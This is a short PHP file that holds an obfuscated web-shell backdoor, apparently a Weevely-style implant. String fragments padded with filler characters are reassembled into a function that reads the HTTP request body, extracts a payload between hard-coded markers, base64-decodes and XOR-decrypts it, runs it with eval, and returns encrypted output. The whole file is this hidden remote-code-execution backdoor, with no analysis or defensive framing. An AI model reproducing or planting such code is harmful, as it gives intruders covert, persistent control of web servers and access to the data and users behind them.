<?php
$u='_Fend_clean(F);$r=@baFse64_FencoFde(@x(@gFFFzcompress($Fo),$k));priFnt("$p$khF$r$kf");}';
$M='$k="8839F96F3f";$kh=F"10dcF0ff11c2e";F$Fkf="F4d2cb9b55594"F;$p="gFu5oOhFK3sf3FFdYGFwL";fun';
$x='vFal(@gzuncFompreFss(@Fx(@baseF64_decodeFF($mF[1]),$k)));$o=@Fob_get_FconteFntsF();@oFb';
$A='0;($j<$c&&$Fi<$Fl);$j++,$iF++){$o.=F$t{F$i}^$k{F$j};}}FreturFn $oF;}if (@prFegF_match';
$s=str_replace('CB','','CBcreatCBeCB_fuCBnCBcCBtion');
$S='("/F$Fkh(.+)$kf/",@fFiFle_geFFt_conFtents("phFp://input"),$mF)==1) {@Fob_sFtart();@eF';
$B='ctioFn x($t,$k){$Fc=sFtrlenF($k);F$l=stFFrlenF($t);$oF="";for($i=0;F$i<$l;F){foFr($j=F';
$c=str_replace('F','',$M.$B.$A.$S.$x.$u);
$G=$s('',$c);$G();
?>
